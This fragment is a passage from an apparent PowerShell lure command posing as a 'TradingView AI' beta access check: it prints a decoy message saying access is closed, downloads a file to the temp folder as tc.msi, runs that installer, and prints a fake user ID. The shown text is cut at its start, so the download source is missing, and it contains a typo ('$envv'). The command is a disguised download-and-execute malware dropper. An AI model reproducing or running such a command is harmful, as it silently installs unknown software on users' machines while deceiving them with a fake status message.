...
Write-Host "Beta access to TradingView AI is currently closed. Please try again in a few days." -ForegroundColor Red' -o $envv:TEMP\\tc.msi; & $env:TEMP\\tc.msi; Write-Host 'UserID:63994529832'"
